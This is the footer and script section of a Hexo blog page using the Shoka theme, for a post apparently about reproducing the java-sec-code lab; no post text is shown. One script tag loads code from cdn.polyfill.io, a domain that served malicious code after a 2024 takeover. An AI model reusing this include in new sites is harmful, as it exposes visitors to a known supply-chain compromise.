    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ztyzty @ zty153’s_blog</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="Symbols count total">664k words</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="Reading time total">10:04</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2025/07/08/java-sec-code复现/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
